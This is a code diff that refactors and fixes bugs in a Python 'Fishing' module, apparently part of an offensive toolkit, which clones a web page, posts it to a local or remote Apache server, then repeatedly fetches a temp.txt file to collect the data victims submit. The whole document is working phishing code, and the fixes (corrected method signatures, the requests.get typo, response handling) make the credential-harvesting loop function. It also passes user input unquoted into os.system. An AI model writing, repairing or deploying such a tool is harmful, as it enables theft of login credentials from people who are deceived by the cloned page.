@@ -1,35 +1,37 @@
-import Includes.includes as include
-from Setup.setup import commands
-import requests
-import urllib.request
-import time
-import modules.Attack.cloning as clone
 import os
+import time
+
+import requests
+
+import modules.Attack.cloning as clone
+import utils.utils as include
+from Setup.setup import commands
+
 
 class Fishing:
 
-    def __str__():
+    def __str__(self):
         return 'Fishing attack'
 
-    def run():
+    def run(self):
         fish()
 
 
 def fish():
-    '''
+    """
     Fishing attack
     :return: void
-    '''
+    """
 
-    ### Deal with the output file
+    # Deal with the output file
     slash = include.command(commands, 'slash')
-    outputFile = str(input("output file: "))
-    dir = "data%sFishing" % slash
-    fileName = dir+slash+outputFile
+    output_file = str(input("output file: "))
+    directory = "data%sFishing" % slash
+    file_name = directory + slash + output_file
     # Checks on the existence and craeation if necessary
-    if os.path.isdir(dir) == False:
-        os.system('mkdir %s' % dir)
-    fileName = include.ifexists(fileName)
+    if not os.path.isdir(directory):
+        os.system('mkdir %s' % directory)
+    file_name = include.ifexists(file_name)
 
     # Clone the page and do the necessary edits
     page = clone.clone()
@@ -37,12 +39,12 @@ def fish():
     # Host server
     host = str(input('Host server (localhost or local IP for the IP of your machine): '))
 
-    localAdress = include.get_ip()[1]
+    local_address = include.get_ip()[1]
 
     files = {'file': open(page)}
     port = 80
-    if host == 'localhost' or host == localAdress:
-        version = ""
+    version = ""
+    if host == 'localhost' or host == local_address:
 
         f = open('Setup%sserver.config' % slash, 'r')
         for line in f:
@@ -57,15 +59,14 @@ def fish():
                     port = int(line.split(' ')[2])
 
         if version == 'linux':
-            try:
-                os.system('sudo service apache2 start')
-            except:
+            ret = os.system('sudo service apache2 start')
+            if ret != 0:
                 print("[-] Cannot start the apache server.")
                 print("[-] Exiting the attack")
                 return
 
         try:
-            r = requests.post("%s:%d%sindex.php" % (host,port,slash), files=files)
+            requests.post("%s:%d%sindex.php" % (host, port, slash), files=files)
         except Exception as e:
             print(e)
             print('[-] Unable to send the cloned page to the server')
@@ -75,7 +76,7 @@ def fish():
 
     else:
         try:
-            r = requests.post("http://"+host+"/index.php", files=files)
+            requests.post("http://" + host + "/index.php", files=files)
         except Exception as e:
             print(e)
             print('[-] Unable to send the cloned page to the server')
@@ -83,18 +84,17 @@ def fish():
             time.sleep(5)
 
     print("[+] File sent to the server")
-    target_URL = host+slash+"temp.txt"
+    target_url = host + slash + "temp.txt"
     while 1:
         try:
             print("[*] Listening on http//%s ...." % host)
-            data = request.get(target_URL)
+            data = requests.get(target_url)
             if data.status_code == 200:
-                f = open(fileName, 'w')
-                for line in data.contents:
-                    f.write(line.decode("utf-8"))
-                f.close()
+                with open(file_name, 'w') as f:
+                    f.write(data.text)
             break
-        except:
+        except Exception as e:
+            print(e)
             time.sleep(5)
     if not data.content:
         print("[-] Unable to recieve the data")
@@ -102,6 +102,6 @@ def fish():
         return
     print("[+] Data reveived")
 
-    print('[+] Fishing completed, the file is stored as:  %s' % fileName)
+    print('[+] Fishing completed, the file is stored as:  %s' % file_name)
     if version == 'Linux':
         os.system('sudo service apache2 stop')
